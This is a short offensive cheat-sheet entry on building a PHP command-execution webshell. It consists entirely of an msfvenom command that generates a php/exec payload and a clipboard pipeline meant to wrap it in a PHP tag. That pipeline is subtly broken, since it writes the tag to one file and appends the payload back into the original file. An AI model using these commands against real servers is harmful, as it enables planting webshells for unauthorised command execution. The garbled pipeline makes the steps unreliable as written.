# Exec Payloads

## Execute Webshells Exec Payload

### 01 - PHP

```
$ msfvenom -p php/exec cmd="<commands>" -f raw -o exec.php

$ cat exec.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> exec.php
```